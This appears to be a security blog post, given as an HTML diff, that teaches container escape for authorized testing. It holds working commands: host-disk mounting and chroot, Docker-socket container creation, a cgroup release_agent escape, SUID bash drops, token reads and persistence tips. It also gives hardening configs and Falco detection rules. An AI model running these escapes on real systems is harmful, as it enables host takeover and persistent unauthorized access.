@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Container Escape: From Enumeration to Host Root — awwfensive</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="../favicon.png">
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: monospace;
+            background: #fdfdfd;
+            color: #222;
+            font-size: 18px;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 720px;
+            margin: auto;
+        }
+        header {
+            margin-bottom: 2.5rem;
+            border-bottom: 2px solid #4caf50;
+            padding-bottom: 1rem;
+        }
+        h1 {
+            margin: 0 0 10px;
+            font-size: 2.5rem;
+            color: #000;
+            line-height: 1.2;
+        }
+        h1::before {
+            content: "$ ";
+            color: #4caf50;
+        }
+        .post-meta {
+            font-size: 1rem;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        .post-tags {
+            margin-top: 10px;
+        }
+        .tag {
+            display: inline-block;
+            background: #f0f0f0;
+            color: #555;
+            padding: 3px 10px;
+            margin-right: 8px;
+            margin-bottom: 5px;
+            border-radius: 3px;
+            font-size: 0.9rem;
+        }
+        .tag::before {
+            content: "#";
+            color: #4caf50;
+            margin-right: 2px;
+        }
+        article {
+            margin-bottom: 3rem;
+        }
+        article h2 {
+            font-size: 1.8rem;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            color: #000;
+        }
+        article h3 {
+            font-size: 1.4rem;
+            margin-top: 1.5rem;
+            margin-bottom: 0.8rem;
+            color: #111;
+        }
+        article h4 {
+            font-size: 1.2rem;
+            margin-top: 1.2rem;
+            margin-bottom: 0.6rem;
+            color: #222;
+        }
+        article p {
+            margin-bottom: 1.2rem;
+        }
+        article a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        article a:hover {
+            text-decoration: underline;
+        }
+        article code {
+            background: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.95em;
+            color: #d63384;
+        }
+        article pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            line-height: 1.5;
+            margin: 1.5rem 0;
+        }
+        article pre code {
+            background: none;
+            color: inherit;
+            padding: 0;
+        }
+        article blockquote {
+            margin: 1.5rem 0;
+            padding-left: 20px;
+            border-left: 4px solid #4caf50;
+            color: #555;
+            font-style: italic;
+        }
+        article ul, article ol {
+            margin-bottom: 1.2rem;
+            padding-left: 2rem;
+        }
+        article li {
+            margin-bottom: 0.5rem;
+        }
+        .note {
+            background: #fffbea;
+            border-left: 4px solid #ffa500;
+            padding: 15px;
+            margin: 1.5rem 0;
+            border-radius: 3px;
+        }
+        .note strong {
+            color: #ff8c00;
+        }
+        .danger {
+            background: #ffe5e5;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            margin: 1.5rem 0;
+            border-radius: 3px;
+        }
+        .danger strong {
+            color: #dc3545;
+        }
+        .info {
+            background: #e7f3ff;
+            border-left: 4px solid #0066cc;
+            padding: 15px;
+            margin: 1.5rem 0;
+            border-radius: 3px;
+        }
+        .info strong {
+            color: #0066cc;
+        }
+        .section-divider {
+            border: none;
+            border-top: 2px dashed #ccc;
+            margin: 2rem 0;
+        }
+        .attack-chain {
+            background: #f8f9fa;
+            border: 2px solid #4caf50;
+            padding: 20px;
+            margin: 1.5rem 0;
+            border-radius: 5px;
+        }
+        .attack-chain h4 {
+            margin-top: 0;
+            color: #4caf50;
+        }
+        .attack-step {
+            position: relative;
+            padding-left: 35px;
+            margin-bottom: 15px;
+        }
+        .attack-step::before {
+            content: "→";
+            position: absolute;
+            left: 10px;
+            color: #4caf50;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        footer {
+            margin-top: 3rem;
+            font-size: 1rem;
+            color: #777;
+            text-align: center;
+        }
+        footer a {
+            color: #555;
+            text-decoration: none;
+        }
+        footer a:hover {
+            color: #0066cc;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Container Escape: From Enumeration to Host Root</h1>
+            <div class="post-meta">
+                <span>November 10, 2025</span> · 
+                <span>15 min read</span>
+            </div>
+            <div class="post-tags">
+                <span class="tag">docker</span>
+                <span class="tag">kubernetes</span>
+                <span class="tag">container-escape</span>
+                <span class="tag">privilege-escalation</span>
+                <span class="tag">red-team</span>
+            </div>
+        </header>
+
+        <article>
+            <h2>Introduction</h2>
+            <p>
+                Containers have become the backbone of modern infrastructure, powering everything from microservices to CI/CD pipelines. But here's the uncomfortable truth: containers are not virtual machines. They're processes with fancy namespaces and cgroups, sharing the same kernel as the host. This fundamental architecture creates a fascinating attack surface for security researchers and red teamers.
+            </p>
+
+            <p>
+                This guide is dense, practical, and copy-paste friendly. Whether you're pentesting containerized environments, hardening your Kubernetes cluster, or just curious about how container escapes work, you'll find enumeration commands, exploitation primitives, concrete examples, defensive configurations, and detection rules. Everything here is designed for authorized security assessments in lab environments.
+            </p>
+
+            <div class="danger">
+                <strong>Legal Notice:</strong> Use these techniques only in authorized labs, penetration tests, or security assessments. Unauthorized access to computer systems is illegal. Always obtain explicit written permission before testing any system you don't own.
+            </div>
+
+            <hr class="section-divider">
+
+            <h2>TL;DR: The One-Minute Version</h2>
+
+            <p>
+                If you only have sixty seconds, here's what you need to know about container escapes:
+            </p>
+
+            <ul>
+                <li>Containers share the host kernel—they're <em>processes</em> with namespaces and cgroups, not VMs</li>
+                <li><strong>First step is always enumeration:</strong> Look for <code>/.dockerenv</code>, cgroups, capabilities, <code>/var/run/docker.sock</code>, writable host mounts, and Kubernetes service account tokens</li>
+                <li><strong>High-risk escape vectors:</strong> <code>--privileged</code> containers, mounted Docker socket, <code>CAP_SYS_ADMIN</code> capability, writable host paths, <code>hostPID</code>/<code>hostNetwork</code> in Kubernetes, and kernel CVEs</li>
+            </ul>
+
+            <div class="info">
+                <strong>Quick Win Checklist:</strong> If you find any of these, you're likely one command away from host access: privileged container, Docker socket mount, <code>CAP_SYS_ADMIN</code>, writable <code>/etc</code> or <code>/root</code> mount, elevated Kubernetes RBAC permissions.
+            </div>
+
+            <hr class="section-divider">
+
+            <h2>Understanding the Threat Model</h2>
+
+            <h3>Why Containers Aren't Security Boundaries</h3>
+
+            <p>
+                The most important concept to understand is that containers are <strong>not</strong> security boundaries by design. They're isolation mechanisms built for resource management and application packaging, not for running untrusted code.
+            </p>
+
+            <pre><code># Virtual Machine Model
+Host Kernel → Hypervisor → Guest Kernel → Guest Process
+(True isolation - separate kernels)
+
+# Container Model  
+Host Kernel → Container Runtime → Namespaces/Cgroups → Container Process
+(Shared kernel - weaker isolation)</code></pre>
+
+            <p>
+                Because containers share the host kernel, any kernel vulnerability is automatically exploitable from inside containers. There's no additional security layer protecting the host from a compromised container—only namespace and capability restrictions, which are bypassable under many common misconfigurations.
+            </p>
+
+            <h3>Common Misconceptions</h3>
+
+            <ul>
+                <li><strong>"Containers are isolated"</strong> — They have namespaced visibility, not true isolation</li>
+                <li><strong>"Docker is secure by default"</strong> — Default settings are better than they used to be, but misconfiguration is extremely common</li>
+                <li><strong>"Kubernetes adds security"</strong> — Kubernetes adds orchestration and some security features, but also expands the attack surface significantly</li>
+                <li><strong>"Non-root containers are safe"</strong> — Being non-root inside the container helps, but doesn't prevent escapes via capabilities or kernel exploits</li>
+            </ul>
+
+            <hr class="section-divider">
+
+            <h2>Full Enumeration Checklist</h2>
+
+            <p>
+                When you land inside a container, your first goal is reconnaissance. These commands help you understand your environment and identify potential escape vectors. All commands are designed to be quiet and avoid triggering obvious alerts.
+            </p>
+
+            <h3>Environment & Basic Indicators</h3>
+
+            <p>
+                Start with quick checks to confirm you're in a container and identify the container runtime:
+            </p>
+
+            <pre><code># Quick indicators
+[ -f /.dockerenv ] && echo "dockerenv present"
+cat /proc/1/cgroup
+env | grep -iE 'kube|docker|container'
+ls -la /
+df -h
+uname -a</code></pre>
+
+            <div class="info">
+                <strong>What to look for:</strong> The <code>/.dockerenv</code> file is a dead giveaway for Docker containers. In <code>/proc/1/cgroup</code>, you'll see paths containing "docker" or "kubepods". Environment variables often leak Kubernetes metadata.
+            </div>
+
+            <h3>Files & Mounts</h3>
+
+            <p>
+                Check for the Docker socket (instant win), mounted filesystems, and writable directories that might be host mounts:
+            </p>
+
+            <pre><code># Check docker socket, mounts, writeable host dirs
+ls -la /var/run/docker.sock 2>/dev/null || true
+mount | sed -n '1,200p'
+find / -xdev -type d -writable 2>/dev/null | head -n 50
+grep -R --line-number "kube" /proc/mounts 2>/dev/null || true</code></pre>
+
+            <div class="danger">
+                <strong>Critical Finding:</strong> If <code>/var/run/docker.sock</code> exists and is accessible, you can control the Docker daemon and spawn privileged containers. This is a direct path to host root.
+            </div>
+
+            <h3>Capabilities & Privilege Checks</h3>
+
+            <p>
+                Linux capabilities are the key to many container escapes. Check what capabilities your process has:
+            </p>
+
+            <pre><code># Requires util-linux or libcap-utils; fallback to /proc
+capsh --print 2>/dev/null || true
+grep Cap /proc/self/status
+
+# Privileged quick check
+ip link add dummy0 type dummy 2>/dev/null && echo "likely privileged" || true</code></pre>
+
+            <p>
+                The <code>ip link add</code> command is a clever trick—only privileged containers can create network interfaces. If this succeeds, you're almost certainly in a privileged container.
+            </p>
+
+            <h3>Docker Socket via cURL</h3>
+
+            <p>
+                If the Docker socket is mounted, you can query it even without the Docker client:
+            </p>
+
+            <pre><code># If curl is present
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json</code></pre>
+
+            <div class="note">
+                <strong>Pro Tip:</strong> The Docker API is RESTful and fully documented. You can create, start, stop, and execute commands in containers purely through HTTP requests to the socket.
+            </div>
+
+            <h3>Kernel & Exploit Hunting</h3>
+
+            <pre><code>uname -r
+
+# Optional: list kernel config info
+zcat /proc/config.gz 2>/dev/null || true</code></pre>
+
+            <p>
+                The kernel version is critical for identifying known vulnerabilities. Tools like linux-exploit-suggester can help, but be cautious—kernel exploits can crash systems.
+            </p>
+
+            <h3>Kubernetes-Specific Checks</h3>
+
+            <p>
+                In Kubernetes environments, check for service account tokens and API access:
+            </p>
+
+            <pre><code>ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || true
+cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -n 1
+
+# API server base URL
+APISERVER=https://kubernetes.default.svc
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces 2>/dev/null || true</code></pre>
+
+            <div class="info">
+                <strong>Kubernetes Reality:</strong> Most pods automatically mount service account tokens. If the service account has elevated RBAC permissions, you can interact with the Kubernetes API to create privileged pods, list secrets, or even gain cluster admin.
+            </div>
+
+            <hr class="section-divider">
+
+            <h2>High-Probability Escape Vectors</h2>
+
+            <p>
+                Now that we've covered enumeration, let's dive into the actual escape techniques. These are ordered by likelihood of success in real-world environments.
+            </p>
+
+            <h3>1. Privileged Containers</h3>
+
+            <p>
+                <strong>Why it works:</strong> The <code>--privileged</code> flag removes almost all namespace and cgroup enforcement, and grants access to all host devices including block devices.
+            </p>
+
+            <p>
+                <strong>Detection:</strong> Try creating a network interface with <code>ip link add dummy0 type dummy</code>. Success strongly indicates privileged mode.
+            </p>
+
+            <div class="attack-chain">
+                <h4>Exploitation Pattern</h4>
+                <div class="attack-step">Identify you're privileged (network interface creation succeeds)</div>
+                <div class="attack-step">List available block devices with <code>fdisk -l</code></div>
+                <div class="attack-step">Mount host filesystem to local directory</div>
+                <div class="attack-step">Chroot into mounted filesystem for full host access</div>
+            </div>
+
+            <pre><code>mkdir /mnt/host
+mount /dev/sda1 /mnt/host       # or other block devices you find
+chroot /mnt/host /bin/bash
+id</code></pre>
+
+            <p>
+                <strong>What to do on the host:</strong> Once you've chrooted into the host filesystem, you have full root access. Common persistence techniques include:
+            </p>
+
+            <ul>
+                <li>Add SSH keys to <code>/root/.ssh/authorized_keys</code></li>
+                <li>Create new user accounts in <code>/etc/passwd</code> and <code>/etc/shadow</code></li>
+                <li>Add cron jobs or systemd services for persistence</li>
+                <li>Install backdoors or additional access mechanisms</li>
+            </ul>
+
+            <h3>2. Mounted Docker Socket</h3>
+
+            <p>
+                <strong>Why it works:</strong> When <code>/var/run/docker.sock</code> is mounted into a container, that container can control the entire Docker daemon. This is equivalent to root on the host.
+            </p>
+
+            <p>
+                <strong>Detection:</strong>
+            </p>
+
+            <pre><code>ls -la /var/run/docker.sock
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json</code></pre>
+
+            <p>
+                <strong>Exploitation without Docker client:</strong> You can interact with Docker purely through HTTP requests to the Unix socket:
+            </p>
+
+            <pre><code># Create privileged container that mounts host root
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
+
+# Note the container ID from response, then start and attach</code></pre>
+
+            <p>
+                <strong>If Docker client exists inside the container:</strong>
+            </p>
+
+            <pre><code>docker run -v /:/host --privileged -it --rm alpine chroot /host sh</code></pre>
+
+            <div class="danger">
+                <strong>Why this is dangerous:</strong> Mounting the Docker socket is surprisingly common in CI/CD pipelines, monitoring tools, and "Docker-in-Docker" setups. It's often done for convenience without understanding the security implications.
+            </div>
+
+            <h3>3. Excessive Capabilities</h3>
+
+            <p>
+                <strong>Why it works:</strong> Linux capabilities allow fine-grained privilege delegation. Several capabilities effectively grant root access when misused.
+            </p>
+
+            <p>
+                <strong>Detection:</strong>
+            </p>
+
+            <pre><code>capsh --print | grep Cap
+cat /proc/self/status | grep Cap</code></pre>
+
+            <h4>Dangerous Capabilities</h4>
+
+            <ul>
+                <li><strong>CAP_SYS_ADMIN:</strong> Allows mounting filesystems, loading kernel modules, and many other privileged operations. This is nearly equivalent to full root access.</li>
+                <li><strong>CAP_DAC_READ_SEARCH:</strong> Bypass file read permission checks. Can read any file on the system regardless of permissions.</li>
+                <li><strong>CAP_SYS_PTRACE:</strong> Allows ptracing any process, including those on the host. Can inject code into host processes.</li>
+                <li><strong>CAP_SYS_MODULE:</strong> Load kernel modules. Instant kernel-level code execution.</li>
+            </ul>
+
+            <p>
+                <strong>Exploitation example with CAP_SYS_ADMIN:</strong>
+            </p>
+
+            <pre><code># Mount host filesystem
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+# Find path on host
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/exploit" > /tmp/cgrp/release_agent
+
+# Create exploit script
+cat > /exploit << EOF
+#!/bin/sh
+ps aux > $host_path/output
+EOF
+chmod a+x /exploit
+
+# Trigger execution on host
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"</code></pre>
+
+            <h3>4. Writable Host Mounts</h3>
+
+            <p>
+                <strong>Why it works:</strong> When host directories are bind-mounted into containers with write access, you can alter host files directly.
+            </p>
+
+            <p>
+                <strong>High-value targets:</strong>
+            </p>
+
+            <ul>
+                <li><code>/etc</code> — Modify system configurations, add user accounts, alter service configurations</li>
+                <li><code>/root</code> — Add SSH keys, modify shell profiles for backdoors</li>
+                <li>Any directory used by init scripts — Add backdoors or SUID binaries that persist across reboots</li>
+                <li><code>/var/log</code> — Potentially write to log files that get processed by other services</li>
+            </ul>
+
+            <div class="attack-chain">
+                <h4>SUID Binary Escalation</h4>
+                <div class="attack-step">Identify writable host mount (check <code>mount</code> output)</div>
+                <div class="attack-step">Copy bash binary to mounted directory</div>
+                <div class="attack-step">Set SUID bit and root ownership</div>
+                <div class="attack-step">Execute from host for instant root shell</div>
+            </div>
+
+            <pre><code># Drop SUID bash on host (lab environment only)
+cp /bin/bash /mnt/host/tmp/suidbash
+chown root:root /mnt/host/tmp/suidbash
+chmod 4755 /mnt/host/tmp/suidbash
+
+# On host, run:
+# /tmp/suidbash -p  => instant root shell</code></pre>
+
+            <div class="note">
+                <strong>Detection Tip:</strong> Look for mount points in <code>df -h</code> or <code>mount</code> that show filesystem types like "ext4" or "xfs" rather than "overlay" or "tmpfs". These are often host mounts.
+            </div>
+
+            <h3>5. Kubernetes Service Account Tokens & RBAC</h3>
+
+            <p>
+                <strong>Why it works:</strong> Kubernetes pods automatically mount service account tokens by default. If the service account has elevated RBAC permissions, you can interact with the Kubernetes API to escalate privileges.
+            </p>
+
+            <p>
+                <strong>Detection & Enumeration:</strong>
+            </p>
+
+            <pre><code>TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER=https://kubernetes.default.svc
+
+# Check basic access
+curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces
+
+# Check permissions
+curl -k -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles</code></pre>
+
+            <p>
+                <strong>Exploitation strategies:</strong>
+            </p>
+
+            <ul>
+                <li>If you can create pods: Create a privileged pod with host filesystem mounted</li>
+                <li>If you can exec into pods: Use kubectl exec equivalent via API to access other pods</li>
+                <li>If you can read secrets: Enumerate all secrets in the cluster for credentials</li>
+                <li>If you have cluster-admin: Full cluster compromise</li>
+            </ul>
+
+            <div class="info">
+                <strong>Real-world note:</strong> Many production Kubernetes clusters have overly permissive RBAC configurations. Service accounts often have more permissions than necessary due to convenience or troubleshooting needs.
+            </div>
+
+            <h3>6. Kernel Exploits</h3>
+
+            <p>
+                <strong>Why it works:</strong> Containers share the host kernel. Any kernel vulnerability is exploitable from inside containers, potentially leading to host compromise.
+            </p>
+
+            <p>
+                <strong>Detection:</strong> Identify kernel version with <code>uname -r</code> and cross-reference with known CVEs using tools like linux-exploit-suggester.
+            </p>
+
+            <div class="danger">
+                <strong>Extreme Caution Required:</strong> Kernel exploits can crash the entire host system, taking down all containers and potentially corrupting data. Use only in isolated lab environments where system crashes are acceptable. Never use kernel exploits in production assessments without explicit authorization and acceptance of risk.
+            </div>
+
+            <p>
+                <strong>Common kernel vulnerabilities used in container escapes:</strong>
+            </p>
+
+            <ul>
+                <li>Dirty COW (CVE-2016-5195) — Write to read-only memory mappings</li>
+                <li>Dirty Pipe (CVE-2022-0847) — Overwrite data in arbitrary read-only files</li>
+                <li>Various use-after-free vulnerabilities in kernel subsystems</li>
+                <li>Privilege escalation through eBPF vulnerabilities</li>
+            </ul>
+
+            <hr class="section-divider">
+
+            <h2>Defense: Hardening Containers</h2>
+
+            <p>
+                Now let's flip perspectives and discuss how to defend against these attacks. Defense in depth is critical—no single control will stop a determined attacker.
+            </p>
+
+            <h3>Docker Security Best Practices</h3>
+
+            <pre><code># Never run privileged containers in production
+docker run --security-opt=no-new-privileges \
+  --cap-drop=ALL \
+  --cap-add=NET_BIND_SERVICE \
+  --read-only \
+  --tmpfs /tmp \
+  my-image
+
+# Never mount the Docker socket
+# If absolutely necessary, use socket proxies with whitelisted commands</code></pre>
+
+            <h3>Kubernetes Pod Security Standards</h3>
+
+            <pre><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: secure-pod
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    fsGroup: 1000
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+  - name: app
+    image: my-image
+    securityContext:
+      allowPrivilegeEscalation: false
+      readOnlyRootFilesystem: true
+      capabilities:
+        drop:
+        - ALL
+    volumeMounts:
+    - name: tmp
+      mountPath: /tmp
+  volumes:
+  - name: tmp
+    emptyDir: {}</code></pre>
+
+            <h3>Network Policies</h3>
+
+            <pre><code>apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: deny-egress-to-metadata
+spec:
+  podSelector: {}
+  policyTypes:
+  - Egress
+  egress:
+  - to:
+    - ipBlock:
+        cidr: 0.0.0.0/0
+        except:
+        - 169.254.169.254/32  # Block cloud metadata services</code></pre>
+
+            <h3>Runtime Security</h3>
+
+            <p>
+                Consider deploying runtime security tools that monitor container behavior:
+            </p>
+
+            <ul>
+                <li><strong>Falco:</strong> Runtime threat detection for containers and Kubernetes</li>
+                <li><strong>Sysdig:</strong> Container visibility and security platform</li>
+                <li><strong>Aqua Security:</strong> Full container security lifecycle</li>
+                <li><strong>AppArmor/SELinux:</strong> Mandatory access control for containers</li>
+            </ul>
+
+            <hr class="section-divider">
+
+            <h2>Detection & Monitoring</h2>
+
+            <h3>Key Indicators of Compromise</h3>
+
+            <ul>
+                <li>Process creation inside containers accessing <code>/proc/*/root</code></li>
+                <li>Mount system calls from containers</li>
+                <li>Network connections to Kubernetes API from unusual pods</li>
+                <li>Containers attempting to access block devices</li>
+                <li>Privilege escalation attempts (setuid/setgid calls)</li>
+                <li>Unexpected file modifications in host mount paths</li>
+            </ul>
+
+            <h3>Sample Falco Rules</h3>
+
+            <pre><code>- rule: Docker Socket Accessed
+  desc: Detect access to Docker socket from container
+  condition: >
+    evt.type = open and
+    fd.name = /var/run/docker.sock and
+    container.id != host
+  output: Container accessed Docker socket (user=%user.name container=%container.name)
+  priority: CRITICAL
+
+- rule: Mount Syscall in Container
+  desc: Detect mount operations from containers
+  condition: >
+    evt.type = mount and
+    container.id != host
+  output: Mount operation from container (user=%user.name container=%container.name)
+  priority: WARNING</code></pre>
+
+            <hr class="section-divider">
+
+            <h2>Lab Setup & Practice</h2>
+
+            <p>
+                The best way to understand these techniques is to practice in a safe environment. Here's how to build your own container escape lab.
+            </p>
+
+            <h3>Quick Vulnerable Lab Setup</h3>
+
+            <pre><code># Privileged container
+docker run -it --privileged ubuntu:latest bash
+
+# Docker socket mounted
+docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest bash
+
+# Writable host mount
+docker run -it -v /:/host ubuntu:latest bash
+
+# Excessive capabilities
+docker run -it --cap-add=SYS_ADMIN ubuntu:latest bash</code></pre>
+
+            <h3>Recommended Practice Resources</h3>
+
+            <ul>
+                <li><strong>HackTheBox:</strong> Several machines focused on container escapes</li>
+                <li><strong>TryHackMe:</strong> Docker and Kubernetes security rooms</li>
+                <li><strong>Kubernetes Goat:</strong> Intentionally vulnerable Kubernetes cluster for practice</li>
+                <li><strong>Bad Pods:</strong> Repository of vulnerable Kubernetes pod configurations</li>
+            </ul>
+
+            <hr class="section-divider">
+
+            <h2>Conclusion</h2>
+
+            <p>
+                Container security is complex because containers sit in an uncomfortable middle ground between traditional processes and virtual machines. They provide isolation that's sufficient for most operational needs but insufficient as a security boundary against determined adversaries.
+            </p>
+
+            <p>
+                The key takeaways are:
+            </p>
+
+            <ul>
+                <li>Always enumerate thoroughly—container escapes often come down to finding one misconfiguration</li>
+                <li>Understand that containers share the kernel—kernel security is container security</li>
+                <li>Defense requires layers: proper configuration, minimal capabilities, runtime monitoring, and network policies</li>
+                <li>Most container escapes exploit misconfigurations rather than zero-days</li>
+                <li>Practice these techniques only in authorized lab environments</li>
+            </ul>
+
+            <p>
+                Whether you're attacking or defending containerized infrastructure, the fundamental principle remains the same: understand the underlying architecture. Containers are not magic isolation bubbles—they're carefully orchestrated Linux primitives that can be bypassed when misconfigured.
+            </p>
+
+            <p>
+                Stay curious, stay ethical, and always test in authorized environments.
+            </p>
+
+            <hr class="section-divider">
+
+            <h2>Additional Resources</h2>
+
+            <h3>Tools</h3>
+
+            <ul>
+                <li><strong>amicontained:</strong> Container introspection tool to identify capabilities and configuration</li>
+                <li><strong>deepce:</strong> Docker enumeration, escalation of privileges, and container escapes</li>
+                <li><strong>cdk:</strong> Zero dependency container penetration toolkit</li>
+                <li><strong>kubectl-who-can:</strong> Show who has RBAC permissions in Kubernetes</li>
+                <li><strong>kube-hunter:</strong> Hunt for security weaknesses in Kubernetes clusters</li>
+                <li><strong>trivy:</strong> Vulnerability scanner for containers and other artifacts</li>
+            </ul>
+
+            <h3>Further Reading</h3>
+
+            <ul>
+                <li><a href="https://docs.docker.com/engine/security/" target="_blank">Docker Security Documentation</a></li>
+                <li><a href="https://kubernetes.io/docs/concepts/security/pod-security-standards/" target="_blank">Kubernetes Pod Security Standards</a></li>
+                <li><a href="https://attack.mitre.org/matrices/enterprise/containers/" target="_blank">MITRE ATT&CK: Containers Matrix</a></li>
+                <li><a href="https://github.com/stealthcopter/deepce" target="_blank">DeepCE - Docker Enumeration Tool</a></li>
+            </ul>
+
+            <h3>Training Platforms</h3>
+
+            <ul>
+                <li><strong>Kubernetes Security Specialist (CKS):</strong> Official Kubernetes security certification</li>
+                <li><strong>Docker Security Course:</strong> Various platforms offer dedicated container security training</li>
+                <li><strong>Practical DevSecOps:</strong> Hands-on container and Kubernetes security</li>
+            </ul>
+
+            <hr class="section-divider">
+
+            <h2>Acknowledgments</h2>
+
+            <p>
+                Container security research builds on the work of countless researchers and practitioners. Special recognition to the security community members who've documented these techniques, developed tools, and shared knowledge openly.
+            </p>
+
+            <div class="note">
+                <strong>Feedback Welcome:</strong> If you spot errors, have suggestions, or want to share your own container escape experiences, feel free to reach out. Security research thrives on collaboration and knowledge sharing.
+            </div>
+        </article>
+
+        <footer>
+            <hr style="border: none; border-top: 1px dashed #ccc; margin-bottom: 10px;">
+            <nav style="text-align: center; font-size: 1.2rem;">
+                <a href="/pages.html">~/</a>
+            </nav>
+            <div style="font-size: 0.95rem; color: #666; margin-top: 5px;">
+                back.
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
